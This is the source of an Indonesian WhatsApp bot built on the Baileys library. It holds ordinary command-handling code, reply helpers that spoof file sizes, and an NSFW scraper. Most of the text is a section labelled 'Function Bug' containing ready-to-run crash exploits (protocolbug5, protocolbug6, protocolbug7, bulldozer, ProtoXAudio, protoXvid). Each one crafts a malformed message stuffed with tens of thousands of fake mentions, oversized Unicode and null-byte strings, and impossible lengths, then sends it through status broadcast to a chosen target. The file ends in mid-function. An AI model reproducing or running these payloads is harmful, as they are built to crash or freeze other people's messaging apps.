/*
SAUDARAAA DEPAYYYYY ><
RAPIP😎
SANZ🤯
TRAAA😏
DITCHIE 🤬
RAZA MODS 😳
RAPLI 🤗
RAFLIE 😈
CORZA 😱
ALL PARTNER🤤
*/

//CLEAR CONSOLE
console.clear();

//END
//SCANING NikaSetting

require('../NikaSetting/settings')
//END
//INSTALLING BAILEYS

const { default: baileys, downloadContentFromMessage, proto, generateWAMessage, getContentType, prepareWAMessageMedia 
} = require("@whiskeysockets/baileys");
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const { 
GroupSettingChange, 
WAGroupMetadata, 
emitGroupParticipantsUpdate, 
emitGroupUpdate, 
WAGroupInviteMessageGroupMetadata, 
GroupMetadata, 
Headers,
WA_DEFAULT_EPHEMERAL,
getAggregateVotesInPollMessage, 
generateWAMessageContent, 
areJidsSameUser, 
useMultiFileAuthState, 
fetchLatestBaileysVersion,
makeCacheableSignalKeyStore, 
makeWaSocket,
makeInMemoryStore,
MediaType,
WAMessageStatus,
downloadAndSaveMediaMessage,
AuthenticationState,
initInMemoryKeyStore,
MiscMessageGenerationOptions,
useSingleFileAuthState,
BufferJSON,
WAMessageProto,
MessageOptions,
WAFlag,
WANode,
WAMetric,
ChatModification,
MessageTypeProto,
WALocationMessage,
RedepayyectMode,
WAContextInfo,
ProxyAgent,
waChatKey,
MimetypeMap,
MediaPathMap,
WAContactMessage,
WAContactsArrayMessage,
WATextMessage,
WAMessageContent,
WAMessage,
BaileysError,
WA_MESSAGE_STATUS_TYPE,
MediadepayyInfo,
URL_REGEX,
WAUrlInfo,
WAMediaUpload,
mentionedJid,
processTime,
Browser,
MessageType,
Presence,
WA_MESSAGE_STUB_TYPES,
Mimetype,
relayWAMessage,
Browsers,
DisdepayyectReason,
WASocket,
getStream,
WAProto,
isBaileys,
AnyMessageContent,
templateMessage,
InteractiveMessage,
Header
} = require("@whiskeysockets/baileys");

//END
//EXPORTS BASIC MODULE

const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const jimp = require("jimp")
const sharp = require('sharp')
const crypto = require('crypto')
const yts = require('yt-search')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const timestampp = speed();
const latensi = speed() - timestampp
const moment = require('moment-timezone')
const jsobfus = require('javascript-obfuscator');
const { VocalRemover } = require('../Library-Nika/Data8');
const { ocrSpace } = require("ocr-space-api-wrapper");
const { JSDOM } = require('jsdom')

//END
//MODULE MESSAGE + PREFIX

module.exports = depayy = async (depayy, m, chatUpdate, store) => {
    try {
      var body = (
      m.mtype === "conversation" ? m.message.conversation :
      m.mtype === "imageMessage" ? m.message.imageMessage.caption :
      m.mtype === "videoMessage" ? m.message.videoMessage.caption :
      m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
      m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
      m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
      m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
      m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
      m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);
        var budy = (typeof m.text == 'string' ? m.text : '');
        var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? 
                        body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" 
                      : global.prefa ?? global.prefix
  
//END
//DATA TAMBAHAN + PELENGKAP
const { 
smsg, 
tanggal, 
getTime, 
isUrl, 
sleep, 
clockString, 
runtime, 
fetchJson, 
getBuffer, 
jsonformat, 
format, 
parseMention, 
getRandom, 
getGroupAdm, 
generateProfilePicture 
} = require('../Library-Nika/Data1')



//END
//DATA USER + DATA MESSAGE

const Owner = JSON.parse(fs.readFileSync('./DataBaseNika/Own.json'))
const Premium = JSON.parse(fs.readFileSync('./DataBaseNika/Prem.json'))
const CMD = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase(): ''
const args = body.trim().split(/ +/).slice(1)
const BotNum = await depayy.decodeJid(depayy.user.id)
const isOwner = [BotNum, ...Owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isPremium = [BotNum, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const fatkuns = m.quoted || m;
const quoted = 
  fatkuns.mtype === 'buttonsMessage' ? fatkuns[Object.keys(fatkuns)[1]] :
  fatkuns.mtype === 'templateMessage' ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] :
  fatkuns.mtype === 'product' ? fatkuns[Object.keys(fatkuns)[0]] :
  m.quoted ? m.quoted :
  m;
const qtext = q = args.join(" ")
const qtek = m.quoted && m.quoted.message && m.quoted.message.imageMessage;
const from = mek.key.remoteJid
const { spawn: spawn, exec } = require('child_process')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await depayy.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = m.isGroup ? await groupMetadata.participants : ''
const GroupAdm = m.isGroup ? await getGroupAdm(participants) : ''
const BotAdm = m.isGroup ? GroupAdm.includes(BotNum) : false
const Adm = m.isGroup ? GroupAdm.includes(m.sender) : false
const pushname = m.pushName || "No Name"
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "🌃𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐌𝐚𝐥𝐚𝐦"
} else if (time >= "15:00:00" && time < "19:00:00") {
    ucapanWaktu = "🌄𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐨𝐫𝐞"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "🏞️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐢𝐚𝐧𝐠"
} else if (time >= "06:00:00" && time < "11:00:00") {
    ucapanWaktu = "🏙️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐏𝐚𝐠𝐢"
} else {
    ucapanWaktu = "🌆𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐮𝐛𝐮𝐡"
};
const todayDateWIB = new Date().toLocaleDateString('id-ID', {
  timeZone: 'Asia/Jakarta', // Zona waktu WIB
  year: 'numeric',
  month: 'long',
  day: 'numeric',
});
const mime = (quoted.msg || quoted).mimetype || ''
//END
// Foto
const nika = fs.readFileSync('./image/depay.jpg')
const img = fs.readFileSync('./image/nika.jpg')
const payy = fs.readFileSync('./image/plenger.jpg')
const payyye = fs.readFileSync('./image/jirlah.jpg')
const menuawal = fs.readFileSync('./image/nikaganteng.jpg')
const payymusik = fs.readFileSync('./image/musik1.mp3')
//DATA TIKTOK SCRAPER

const { tiktok } = require('../Library-Nika/Data5')

  //Function ucapan
function getGreeting() {
const hours = new Date().getHours();
  if (hours >= 0 && hours < 12) {
    return "Good Morning";
  } else if (hours >= 12 && hours < 18) {
    return " Good Afternoon";
  } else {
    return "Good Night";
  }
}
const greeting = getGreeting();
//END
//EXPORTS MODULE BRAT + STICKER

const {
imageToWebp, 
videoToWebp, 
writeExifImg, 
writeExifVid, 
writeExif, 
addExif 
} = require('../Library-Nika/Data2')


//END
//SEETINGS STATUS BOT

if (!depayy.public) {
if (!isOwner) return
}

//END
//INFO NEW MESSAGE IN CONSOLE

if (command) {
  if (m.isGroup) {
    // Log untuk pesan grup
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - GROUP ⌟ ━━━━`));
    console.log(chalk.bgHex('#800080').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Clock : ${time} \n` +
      ` 💬 Message Received : ${m.mtype} \n` +
      ` 🌐 Group Name : ${groupName} \n` +
      ` 🔑 Group Id : ${m.chat} \n` +
      ` 👤 Recipient : ${BotNum} \n`
    ));
  } else {
    // Log untuk pesan privat
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - PRIVATE ⌟ ━━━━`));
    console.log(chalk.bgHex('#800080').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Clock : ${time} \n` +
      ` 💬 Message Received : ${m.mtype} \n` +
      ` 🗣️ Sender : ${pushname} \n` +
      ` 🌐 Group Name : No In Group \n` +
      ` 🔑 Group Id : No In Group \n` +
      ` 👤 Recipient : ${BotNum} \n`
    ));
  }
}

//END
//AUTO RECORDING

let rn = ['recording']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
//depayy.sendPresenceUpdate(jd, from) // HAPUS UNTUK MEMATIKAN
}

//END
//FUNCTION LOADING

async function loading () {
var Floading = [
"",
"",
""
]
let { key } = await depayy.sendMessage(from, {text: " "})
for (let i = 0; i < Floading.length; i++) {
await depayy.sendMessage(from, {text: Floading[i], edit: key });
}
}

//END
//FILE RESIZE ( FAKE )

const FileSize = (number) => {
var SI_POSTFIXES = ["B", " KB", " MB", " GB", " TB", " PB", " EB"]
var tier = Math.log10(Math.abs(number)) / 3 | 0
if(tier == 0) return number
var postfix = SI_POSTFIXES[tier]
var scale = Math.pow(10, tier * 3)
var scaled = number / scale
var formatted = scaled.toFixed(1) + ''
if (/\.0$/.test(formatted))
formatted = formatted.substr(0, formatted.length - 2)
return formatted + postfix
}

//END

   //Reply
const payreply = (teks) => {
        return depayy.sendMessage(m.chat, {text: teks,  contextInfo: {
            document: fs.readFileSync("./package.json"),
            filename: `depayy`,
            mimetype: 'application/pdf',
	fileLength: 99999999999999999999999999999999999999,
    pageCount: 10909143,	
                    mentionedJid: [m.sender],
                    externalAdReply: {
                        showAdAttribution: true,
                        title: `𝗡𝗜𝗞𝗔 𝗩𝟭𝟭 𝗩𝗜𝗣`,
                        body: `Ⓓ 𝐷𝑒𝑝𝑎𝑦𝑦`,
                        previewType: "PHOTO",
                        thumbnail: img,
                        sourceUrl: ``                   }
                }}, {quoted: lol})}

const Reply = (teks) => {
        return depayy.sendMessage(m.chat, {text: teks,  contextInfo: {
            document: fs.readFileSync("./package.json"),
            filename: `depayy`,
            mimetype: 'application/pdf',
	fileLength: 99999999999999999999999999999999999999,
    pageCount: 10909143,	
                    mentionedJid: [m.sender],
                    externalAdReply: {
                        showAdAttribution: true,
                        title: `𝗡𝗜𝗞𝗔 𝗩𝟭𝟭 𝗩𝗜𝗣`,
                        body: `Ⓓ 𝐷𝑒𝑝𝑎𝑦𝑦`,
                        previewType: "PHOTO",
                        thumbnail: nika,
                        sourceUrl: ``                   }
                }}, {quoted: lol})}

  //qchanel
const qchanel = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363401699840819@newsletter`,
newsletterName: `𝗡𝗜𝗞𝗔 𝗩𝟵 𝗚𝗘𝗡 𝟰`,
jpegThumbnail: "https://files.catbox.moe/c5b74a.jpg",
caption: 'Depayy',
inviteExpiration: Date.now() + 1814400000
}
}}   
//END
    //Nsfw
async function randomNsFw() {
			return new Promise((resolve, reject) => {
				const page = Math.floor(Math.random() * 1153)
				axios.get('https://sfmcompile.club/page/' + page).then((data) => {
					const $ = cheerio.load(data.data)
					const hasil = []
					$('#primary > div > div > ul > li > article').each(function (a, b) {
						hasil.push({
							title: $(b).find('header > h2').text(),
							link: $(b).find('header > h2 > a').attr('href'),
							category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
							share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
							views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
							type: $(b).find('source').attr('type') || 'image/jpeg',
							video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
							video_2: $(b).find('video > a').attr('href') || ''
						})
					})
					resolve(hasil)
				})
			})
		}
		//End
//Awal Function Bug
  async function ProtoXAudio(target, mention) {
    console.log("Attack DelayProto Berjalann...")
    const generateMessage = {
        viewOnceMessage: {
            message: {
                audioMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
                    mimetype: "audio/mpeg",
                    fileSha256: Buffer.from([
            226, 213, 217, 102, 205, 126, 232, 145,
            0,  70, 137,  73, 190, 145,   0,  44,
            165, 102, 153, 233, 111, 114,  69,  10,
            55,  61, 186, 131, 245, 153,  93, 211
        ]),
        fileLength: 432722,
                    seconds: 26,
                    ptt: false,
                    mediaKey: Buffer.from([
            182, 141, 235, 167, 91, 254,  75, 254,
            190, 229,  25,  16, 78,  48,  98, 117,
            42,  71,  65, 199, 10, 164,  16,  57,
            189, 229,  54,  93, 69,   6, 212, 145
        ]),
        fileEncSha256: Buffer.from([
            29,  27, 247, 158, 114,  50, 140,  73,
            40, 108,  77, 206,   2,  12,  84, 131,
            54,  42,  63,  11,  46, 208, 136, 131,
            224,  87,  18, 220, 254, 211,  83, 153
        ]),
                    directPath: "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
                    mediaKeyTimestamp: 1746275400,
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await depayy.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await depayy.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "nika hahahaa" },
                        content: undefined
                    }
                ]
            }
        );
    }
} 
async function bulldozer(isTarget) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(isTarget, message, {});

  await depayy.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: isTarget },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
  async function protoXvid(isTarget, mention) {
const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "nika hahaha" + "ោ៝".repeat(10000),
        title: "⇞ nika hahaha ⇟",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "999999",
        seconds: 999999,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "nika hahaha",
        height: 999999,
        width: 999999,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363381288267213@newsletter",
            serverMessageId: 1,
            newsletterName: "⇞ 💫 nika hahaha ⇟"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(isTarget, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await depayy.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: isTarget }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await depayy.relayMessage(isTarget, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}
   // Protocolbug
async function protocolbug6(target, mention) {
const quotedMessage = {
    extendedTextMessage: {
        text: "᭯".repeat(12000),
        matchedText: "https://" + "ꦾ".repeat(500) + ".com",
        canonicalUrl: "https://" + "ꦾ".repeat(500) + ".com",
        description: "\u0000".repeat(500),
        title: "\u200D".repeat(1000),
        previewType: "NONE",
        jpegThumbnail: Buffer.alloc(10000), 
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            externalAdReply: {
                showAdAttribution: true,
                title: "BoomXSuper",
                body: "\u0000".repeat(10000),
                thumbnailUrl: "https://" + "ꦾ".repeat(500) + ".com",
                mediaType: 1,
                renderLargerThumbnail: true,
                sourceUrl: "https://" + "𓂀".repeat(2000) + ".xyz"
            },
            mentionedJid: Array.from({ length: 1000 }, (_, i) => `${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`)
        }
    },
    paymentInviteMessage: {
        currencyCodeIso4217: "USD",
        amount1000: "999999999",
        expiryTimestamp: "9999999999",
        inviteMessage: "Payment Invite" + "💥".repeat(1770),
        serviceType: 1
    }
};
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "ANGKASA" + "ោ៝".repeat(10000),
        title: "DEPAYY",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://n.uguu.se/BvbLvNHY.jpg",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "109951162777600",
        seconds: 999999,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "ꦾ".repeat(12777),
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
           externalAdReply: {
              showAdAttribution: true,
              title: "ANGKASA",
              body: `${"\u0000".repeat(9117)}`,
              mediaType: 1,
              renderLargerThumbnail: true,
              thumbnailUrl: null,
              sourceUrl: `https://${"ꦾ".repeat(100)}.com/`
        },
           businessMessageForwardInfo: {
              businessOwnerJid: target,
        },
            quotedMessage: quotedMessage,
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363331859075083@newsletter",
            serverMessageId: 1,
            newsletterName: `${"ꦾ".repeat(100)}`
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await depayy.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await depayy.relayMessage(target, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}
async function protocolbug7(isTarget, mention) {
  const floods = 40000;
  const mentioning = "13135550002@s.whatsapp.net";
  const mentionedJids = [
    mentioning,
    ...Array.from({ length: floods }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  const links = "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true";
  const mime = "audio/mpeg";
  const sha = "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=";
  const enc = "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=";
  const key = "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=";
  const timestamp = 99999999999999;
  const path = "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0";
  const longs = 99999999999999;
  const loaded = 99999999999999;
  const data = "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==";

  const messageContext = {
    mentionedJid: mentionedJids,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363321780343299@newsletter",
      serverMessageId: 1,
      newsletterName: "💫 ANGKASA"
    }
  };

  const messageContent = {
    ephemeralMessage: {
      message: {
        audioMessage: {
          url: links,
          mimetype: mime,
          fileSha256: sha,
          fileLength: longs,
          seconds: loaded,
          ptt: true,
          mediaKey: key,
          fileEncSha256: enc,
          directPath: path,
          mediaKeyTimestamp: timestamp,
          contextInfo: messageContext,
          waveform: data
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(isTarget, messageContent, { userJid: isTarget });

  const broadcastSend = {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: isTarget }, content: undefined }
            ]
          }
        ]
      }
    ]
  };

  await depayy.relayMessage("status@broadcast", msg.message, broadcastSend);

  if (mention) {
    await depayy.relayMessage(isTarget, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: {
          is_status_mention: " null - exexute "
        },
        content: undefined
      }]
    });
  }
}
   async function protocolbug5(isTarget, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `${1}${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".ANGKASA" + "ោ៝".repeat(10000),
        title: "Finix",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
